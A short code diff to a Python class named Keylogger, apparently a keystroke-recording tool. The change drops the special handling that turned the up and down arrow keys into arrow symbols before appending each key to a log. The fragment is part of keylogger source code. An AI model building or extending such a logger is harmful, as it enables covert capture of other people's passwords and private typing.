@@ -19,10 +19,6 @@ class Keylogger:
         except AttributeError:
             if key == key.space:
                 current_key = ' '
-            elif key == key.up:
-                current_key = '↑'
-            elif key == key.down:
-                current_key = '↓'
             else:
                 current_key = ' ' + str(key) + ' '
         self.append_to_log(current_key + '/')
